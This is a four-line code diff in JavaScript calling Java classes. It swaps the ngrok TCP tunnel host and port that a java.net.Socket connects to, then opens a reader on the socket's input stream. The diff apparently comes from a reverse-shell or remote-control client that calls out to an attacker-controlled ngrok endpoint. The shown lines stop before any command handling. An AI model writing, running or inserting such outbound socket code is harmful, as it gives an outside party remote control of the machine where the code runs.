@@ -1,4 +1,4 @@
-var sock = new java.net.Socket("4.tcp.eu.ngrok.io", 17544);
+var sock = new java.net.Socket("5.tcp.eu.ngrok.io", 11828);
 if (sock.isConnected())
 {
   var input = new java.io.BufferedReader(new java.io.InputStreamReader(sock.getInputStream()));
